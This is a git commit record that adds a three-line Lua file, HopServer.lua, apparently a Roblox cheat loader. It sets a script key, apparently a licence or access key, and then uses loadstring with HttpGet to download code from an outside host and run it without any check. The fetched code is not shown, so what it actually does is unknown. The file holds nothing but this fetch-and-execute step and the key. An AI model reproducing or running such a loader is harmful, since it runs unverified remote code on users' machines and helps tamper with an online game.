b4a36b10152c8f1a8bd2e17916e7e675ee8fbcbe
TurboLite <168972472+TurboLite@users.noreply.github.com>
2026-04-17 20:18:15 +0700

    Create HopServer.lua

---
+++ HopServer.lua
@@ -0,0 +1,3 @@
+script_key = "e8cn84w9jvdm77lrsrgj4lo2"
+
+loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/2be6c0ffc14980b51ee4fa5ea55b67d56bda4430e466524797c1c503b4b8c336.lua"))()
